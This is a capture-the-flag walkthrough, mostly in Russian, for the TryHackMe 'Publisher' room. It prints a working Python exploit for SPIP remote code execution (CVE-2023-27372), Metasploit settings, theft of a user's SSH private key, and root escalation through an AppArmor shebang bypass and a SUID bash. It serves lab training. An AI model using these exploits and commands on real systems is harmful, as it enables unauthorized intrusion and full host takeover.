```http
https://tryhackme.com/room/publisher
```
___
```ip
10.10.160.215
```
___
# Перечисление
## Nmap
```bash
sudo nmap 10.10.160.215 -sS -sC -sV -T5 -p- -vv -oN publisher.txt 
```

```bash
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFdId2yqBbvM07Y8Dig16xzUhEFwQTFaJOmCYZ/kW6kM
80/tcp open  http    syn-ack ttl 62 Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Publisher's Pulse: SPIP Insights & Tips
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## WEB
```bash
dirsearch -u http://10.10.160.215/
```

```bash
[18:36:35] 403 -  278B  - /.htaccess.orig                                   
[18:36:35] 403 -  278B  - /.htaccess.sample                                 
[18:36:35] 403 -  278B  - /.htaccess.bak1                                   
[18:36:35] 403 -  278B  - /.ht_wsr.txt                                      
[18:36:36] 403 -  278B  - /.htaccess.save                                   
[18:36:36] 403 -  278B  - /.htaccess_orig
[18:36:36] 403 -  278B  - /.html                                            
[18:36:36] 403 -  278B  - /.httr-oauth                                      
[18:36:36] 403 -  278B  - /.htaccess_sc                                     
[18:36:36] 403 -  278B  - /.htpasswds                                       
[18:36:36] 403 -  278B  - /.htaccessBAK                                     
[18:36:36] 403 -  278B  - /.htm
[18:36:36] 403 -  278B  - /.htaccessOLD
[18:36:36] 403 -  278B  - /.htaccessOLD2
[18:36:36] 403 -  278B  - /.htpasswd_test                                   
[18:36:36] 403 -  278B  - /.htaccess_extra
[18:36:37] 403 -  278B  - /.php                                             
[18:37:23] 200 -  622B  - /images/                                          
[18:37:23] 301 -  315B  - /images  ->  http://10.10.111.191/images/         
[18:37:56] 403 -  278B  - /server-status/                                   
[18:37:56] 403 -  278B  - /server-status
```

> [!NOTE]
> Install CMS SPIP!!!!

```bash
ffuf -u http://10.10.160.215/FFUZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt:FFUZ
```

```bash
.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 73ms]
.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 78ms]
images                  [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 72ms]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 73ms]
spip                    [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 75ms]
```

```
SPIP 4.2.0
```
## searhsploit
```bash
searchsploit spip
```

> [!NOTE]
> php/webapps/51536.py


# Exploit
```python
import argparse
import bs4
import html
import requests

def parseArgs():
    parser = argparse.ArgumentParser(description="Poc of CVE-2023-27372 SPIP < 4.2.1 - Remote Code Execution by nuts7")
    parser.add_argument("-u", "--url", default=None, required=True, help="SPIP application base URL")
    parser.add_argument("-c", "--command", default=None, required=True, help="Command to execute")
    parser.add_argument("-v", "--verbose", default=False, action="store_true", help="Verbose mode. (default: False)")
    return parser.parse_args()

def get_anticsrf(url):
    r = requests.get('%s/spip.php?page=spip_pass' % url, timeout=10)
    soup = bs4.BeautifulSoup(r.text, 'html.parser')
    csrf_input = soup.find('input', {'name': 'formulaire_action_args'})
    if csrf_input:
        csrf_value = csrf_input['value']
        if options.verbose:
            print("[+] Anti-CSRF token found : %s" % csrf_value)
        return csrf_value
    else:
        print("[-] Unable to find Anti-CSRF token")
        return -1

def send_payload(url, payload):
    data = {
        "page": "spip_pass",
        "formulaire_action": "oubli",
        "formulaire_action_args": csrf,
        "oubli": payload
    }
    r = requests.post('%s/spip.php?page=spip_pass' % url, data=data)
    if options.verbose:
        print("[+] Execute this payload : %s" % payload)
    return 0

if __name__ == '__main__':
    options = parseArgs()

    requests.packages.urllib3.disable_warnings()
    requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS += ':HIGH:!DH:!aNULL'
    try:
        requests.packages.urllib3.contrib.pyopenssl.util.ssl_.DEFAULT_CIPHERS += ':HIGH:!DH:!aNULL'
    except AttributeError:
        pass

    csrf = get_anticsrf(url=options.url)
    send_payload(url=options.url, payload="s:%s:\"<?php system('%s'); ?>\";" % (20 + len(options.command), options.command))
```

## Metasploit
```bash
use multi/http/spip_rce_form
set RHOSTS 10.10.160.215
set TARGETURI spip
set LHOST 10.9.0.6
run
```

# LPE
## FLAG1
```bash
cat /home/think/user.txt
```

```bash
cat /home/think/.ssh/id_rsa 
```

```bash
chmod 600 id_rsa 
ssh -i id_rsa think@10.10.160.215
```


```bash
think@ip-10-10-160-215:/$ ls -la /usr/sbin/run_container
-rwsr-sr-x 1 root root 16760 Nov 14  2023 /usr/sbin/run_container
```

```bash
strings /usr/sbin/run_container
```
___
### [AppArmor Обход Шебанга](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/docker-security/apparmor.html#apparmor-shebang-bypass)

В [**этой ошибке**](https://bugs.launchpad.net/apparmor/+bug/1911431) вы можете увидеть пример того, как **даже если вы предотвращаете запуск Perl с определенными ресурсами** , если вы просто создаете скрипт оболочки, **указав его** в первой строке **`#!/usr/bin/perl`**, и **запускаете файл напрямую** , вы сможете выполнить все, что захотите. Например:

`echo '#!/usr/bin/perl use POSIX qw(strftime); use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh"' > /tmp/test.pl chmod +x /tmp/test.pl /tmp/test.pl`

___
```bash
echo '#!/usr/bin/perl use POSIX qw(strftime); use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh"' > /var/tmp/test.pl chmod +x /var/tmp/test.pl /var/tmp/test.pl

echo "chmod u+s /bin/bash" >> /opt/run_container.sh

/opt/run_container.sh

/bin/bash -p 
```

Flag2
```bash
cat /root/root.txt
```